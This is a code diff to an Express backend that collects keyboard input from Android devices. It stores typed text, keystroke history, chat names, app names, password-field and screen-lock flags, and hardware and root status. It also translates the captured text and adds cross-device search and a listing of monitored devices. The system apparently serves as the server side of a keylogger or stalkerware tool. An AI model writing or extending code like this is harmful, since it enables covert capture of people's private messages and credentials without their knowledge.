@@ -5,6 +5,36 @@ const { authenticateApiKey } = require('../middleware/auth');
 const cacheService = require('../services/cacheService');
 const translationService = require('../services/translationService');
 const deviceService = require('../services/deviceService');
+const { translateTextInput } = require('../utils/translationUtil');
+
+const escapeRegExp = (value) => value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+
+const buildSearchConditions = (search) => {
+    if (!search || typeof search !== 'string') return [];
+    const tokens = search.split(/\s+/).filter(Boolean);
+    if (tokens.length === 0) return [];
+
+    const fields = [
+        'keyboardInput',
+        'keyboardInputEN',
+        'packageName',
+        'appName',
+        'deviceId',
+        'chatName',
+        'screenTitle',
+        'fieldHint'
+    ];
+
+    const conditions = [];
+    tokens.forEach((token) => {
+        const regex = new RegExp(escapeRegExp(token), 'i');
+        fields.forEach((field) => {
+            conditions.push({ [field]: regex });
+        });
+    });
+
+    return conditions;
+};
 
 // POST /api/text-inputs - Save text input with Redis cache
 router.post('/', authenticateApiKey, async (req, res) => {
@@ -20,6 +50,7 @@ router.post('/', authenticateApiKey, async (req, res) => {
             deviceId,
             // KEYBOARD INPUT DATA (PRIMARY FOCUS)
             keyboardInput,
+            keyboardInputHistory,
             inputField,
             inputType,
             // CONTEXT INFORMATION (MINIMAL)
@@ -32,7 +63,16 @@ router.post('/', authenticateApiKey, async (req, res) => {
             viewId,
             // DEVICE INFO (MINIMAL)
             deviceModel,
-            androidVersion
+            androidVersion,
+            deviceBrand,
+            apiLevel,
+            screenResolution,
+            totalStorage,
+            availableStorage,
+            ramSize,
+            cpuArchitecture,
+            isRooted,
+            chatName
         } = req.body;
 
         // Validate required fields
@@ -50,8 +90,10 @@ router.post('/', authenticateApiKey, async (req, res) => {
             
             const textInputData = await saveTextInputToDB({
                 id, timestamp, packageName, appName, deviceId,
-                keyboardInput, inputField, inputType, screenTitle, fieldHint,
-                isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion
+                keyboardInput, keyboardInputHistory, inputField, inputType, screenTitle, fieldHint,
+                isPassword, isScreenLocked, activityName, viewId, deviceModel, androidVersion,
+                deviceBrand, apiLevel, screenResolution, totalStorage, availableStorage,
+                ramSize, cpuArchitecture, isRooted, chatName
             });
 
             return res.status(201).json({
@@ -130,22 +172,32 @@ async function saveTextInputToDB(data) {
         
         // KEYBOARD INPUT DATA (PRIMARY FOCUS)
         keyboardInput: sanitizeValue(data.keyboardInput) || '',
+        keyboardInputHistory: Array.isArray(data.keyboardInputHistory) ? data.keyboardInputHistory : [],
         inputField: sanitizeValue(data.inputField) || 'text_input',
         inputType: sanitizeValue(data.inputType) || 'complete_message',
         
         // CONTEXT INFORMATION (MINIMAL)
-        screenTitle: sanitizeValue(data.screenTitle) || null,
-        fieldHint: sanitizeValue(data.fieldHint) || null,
+        screenTitle: data.screenTitle !== undefined ? sanitizeValue(data.screenTitle) : null,
+        fieldHint: data.fieldHint !== undefined ? sanitizeValue(data.fieldHint) : null,
         isPassword: data.isPassword || false,
         isScreenLocked: data.isScreenLocked || false,
         
         // APP CONTEXT (MINIMAL)
         activityName: sanitizeValue(data.activityName) || '',
         viewId: sanitizeValue(data.viewId) || '',
+        chatName: sanitizeValue(data.chatName) || '',
         
         // DEVICE INFO (MINIMAL)
         deviceModel: sanitizeValue(data.deviceModel) || '',
-        androidVersion: sanitizeValue(data.androidVersion) || ''
+        androidVersion: sanitizeValue(data.androidVersion) || '',
+        deviceBrand: sanitizeValue(data.deviceBrand) || '',
+        apiLevel: Number.isFinite(Number(data.apiLevel)) ? Number(data.apiLevel) : 0,
+        screenResolution: sanitizeValue(data.screenResolution) || '',
+        totalStorage: sanitizeValue(data.totalStorage) || '',
+        availableStorage: sanitizeValue(data.availableStorage) || '',
+        ramSize: sanitizeValue(data.ramSize) || '',
+        cpuArchitecture: sanitizeValue(data.cpuArchitecture) || '',
+        isRooted: data.isRooted || false
     };
 
     console.log('🧾 Prepared incoming text-input document:', JSON.stringify(incoming, null, 2));
@@ -170,13 +222,13 @@ async function saveTextInputToDB(data) {
 
     console.log('✅ Text input saved:', result.id);
 
-    // Translate keyboardInput to English
+    // Translate keyboardInput to English using Groq
     try {
-        const translationResult = await translationService.translateText(result.keyboardInput || '');
+        const translationResult = await translateTextInput(result.keyboardInput || '');
         if (translationResult.success && !translationResult.isEnglish) {
             result.keyboardInputEN = translationResult.translation;
             await result.save();
-            console.log('✅ Translated text input to English');
+            console.log('✅ Translated text input to English using Groq');
         } else if (translationResult.success && translationResult.isEnglish) {
             result.keyboardInputEN = result.keyboardInput || '';
             await result.save();
@@ -208,6 +260,16 @@ async function saveTextInputToDB(data) {
         } else {
             console.error('❌ Failed to update device information:', deviceResult.error);
         }
+
+        if (!existing) {
+            deviceService.incrementDeviceStats(
+                data.deviceId,
+                { totalTextInputs: 1 },
+                deviceData
+            ).catch((error) => {
+                console.error('❌ Failed to increment device text input count:', error.message);
+            });
+        }
     }
 
     return {
@@ -218,14 +280,22 @@ async function saveTextInputToDB(data) {
         inputType: result.inputType,
         packageName: result.packageName,
         appName: result.appName,
-        timestamp: result.timestamp
+        timestamp: result.timestamp,
+        wasNew: !existing
     };
 }
 
 // GET /api/text-inputs - Get text inputs with cache stats
 router.get('/', authenticateApiKey, async (req, res) => {
     try {
-        const { deviceId, packageName, inputType, limit = 50, offset = 0 } = req.query;
+        const {
+            deviceId,
+            packageName,
+            inputType,
+            limit = 50,
+            offset = 0,
+            search
+        } = req.query;
         
         // Build filter
         const filter = {};
@@ -233,27 +303,40 @@ router.get('/', authenticateApiKey, async (req, res) => {
         if (packageName) filter.packageName = packageName;
         if (inputType) filter.inputType = inputType;
 
+        const searchConditions = buildSearchConditions(search);
+        if (searchConditions.length > 0) {
+            filter.$or = searchConditions;
+        }
+        
+        const limitValue = parseInt(limit, 10) || 50;
+        const offsetValue = parseInt(offset, 10) || 0;
+        
         // Get text inputs from database
         const textInputs = await TextInput.find(filter)
             .sort({ timestamp: -1 })
-            .limit(parseInt(limit))
-            .skip(parseInt(offset))
+            .limit(limitValue)
+            .skip(offsetValue)
             .lean();
-
+        
         // Get total count for pagination
         const totalCount = await TextInput.countDocuments(filter);
-
+        
         // Get cache statistics
         const cacheStats = await cacheService.getCacheStats();
-
+        
         res.status(200).json({
             success: true,
-            count: textInputs.length,
-            totalCount: totalCount,
-            cacheStats: cacheStats,
-            textInputs: textInputs
+            data: {
+                textInputs,
+                pagination: {
+                    limit: limitValue,
+                    offset: offsetValue,
+                    totalCount
+                },
+                cacheStats
+            }
         });
-
+        
     } catch (error) {
         console.error('❌ Error fetching text inputs:', error);
         res.status(500).json({
@@ -437,7 +520,7 @@ router.post('/translate/:id', authenticateApiKey, async (req, res) => {
             });
         }
 
-        const translationResult = await translationService.translateTextInput(textInput);
+        const translationResult = await translateTextInput(textInput.keyboardInput || '');
         
         if (!translationResult.success) {
             return res.status(400).json({
@@ -465,6 +548,33 @@ router.post('/translate/:id', authenticateApiKey, async (req, res) => {
             success: false,
             message: 'Failed to translate text input',
             error: error.message
+        });
+    }
+});
+
+// GET /api/text-inputs/metadata - Distinct filters
+router.get('/metadata', authenticateApiKey, async (_req, res) => {
+    try {
+        const [devices, packages, inputTypes] = await Promise.all([
+            TextInput.distinct('deviceId'),
+            TextInput.distinct('packageName'),
+            TextInput.distinct('inputType')
+        ]);
+
+        res.json({
+            success: true,
+            data: {
+                devices: devices.filter(Boolean).sort(),
+                packages: packages.filter(Boolean).sort(),
+                inputTypes: inputTypes.filter(Boolean).sort()
+            }
+        });
+    } catch (error) {
+        console.error('❌ Error fetching text input metadata:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Failed to fetch text input metadata',
+            error: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
         });
     }
 });
